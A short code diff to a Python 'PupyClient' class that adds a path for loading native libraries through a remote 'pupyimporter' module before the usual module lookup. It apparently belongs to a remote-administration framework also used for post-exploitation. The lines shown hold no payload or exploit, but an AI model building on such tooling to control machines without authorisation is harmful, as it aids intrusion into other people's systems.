@@ -438,8 +438,14 @@ class PupyClient(object):
         # start path should only use "/" as separator
 
         update = False
+
         pupyimporter = self.conn.modules.pupyimporter
         initial_module_name = module_name
+
+        if not self.desc.get('native', False):
+            # If this is not light-weight "client", then try to load native libs frist
+            if pupyimporter.native_import(module_name):
+                return True
 
         if not remote and not module_name.endswith(('.dll', '.so')):
             if pupyimporter.has_module(module_name):
